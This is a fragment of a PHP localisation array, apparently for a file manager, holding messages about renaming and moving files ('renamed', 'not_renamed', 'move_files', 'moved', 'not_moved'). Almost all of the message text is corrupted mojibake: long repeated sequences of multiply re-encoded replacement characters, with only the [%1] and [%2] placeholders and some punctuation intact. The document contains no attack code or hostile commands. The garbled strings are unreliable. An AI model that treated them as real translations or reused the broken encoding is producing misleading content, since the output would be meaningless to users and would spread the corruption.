'renamed' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%2]".',
'not_renamed' => '"[%1] Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%2]".',
'move_files' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:',
'moved' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ \"[%2]\":\n[%1]",
'not_moved' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ \"[%2]\":\n[%1]",
